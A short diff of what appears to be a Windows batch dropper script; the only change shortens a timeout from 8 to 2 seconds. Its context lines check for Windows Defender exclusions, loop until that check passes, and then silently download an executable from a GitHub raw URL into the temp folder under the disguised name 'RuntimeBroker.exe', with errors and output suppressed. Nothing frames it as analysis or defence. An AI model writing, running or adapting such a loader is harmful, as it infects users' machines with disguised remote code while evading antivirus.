@@ -13,7 +13,7 @@ powershell -Command "if ((Get-MpPreference -ErrorAction SilentlyContinue).Exclus
 if %errorlevel% neq 0 (
     goto :A
 )
-timeout /t 8 >nul 2>&1
+timeout /t 2 >nul 2>&1
 powershell -Command "$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing" >nul 2>&1
 
 :W
